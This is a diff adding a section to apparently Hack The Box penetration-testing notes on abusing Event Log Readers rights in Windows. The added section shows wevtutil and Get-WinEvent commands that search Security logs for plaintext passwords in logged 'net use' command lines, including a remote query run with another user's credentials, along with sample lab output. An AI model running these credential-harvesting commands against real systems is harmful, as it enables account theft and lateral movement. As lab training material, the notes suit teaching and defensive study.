@@ -88,3 +88,28 @@ Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
 SamAccountName: Administrator
 <...snip...>
 ```
+
+Searching Logs with Event Log Reader:
+
+With Event Log Reader Permission, we can read logs from local machine using wevutil or Get-WinEvent cmdlet, sometimes we might be able to find plaintext credentials or other usable material in the logs:
+
+```
+PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"
+
+        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
+```
+
+If we have other user's credential, we can also run wevutil with other user's credential:
+```
+C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+```
+
+We can also use Get-WinEvent, but such requires admin access or specific permission adjusting on regkey `HKLM\System\CurrentControlSet\Services\Eventlog\Security` beforehead:
+
+```
+PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+
+CommandLine
+-----------
+net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
+```
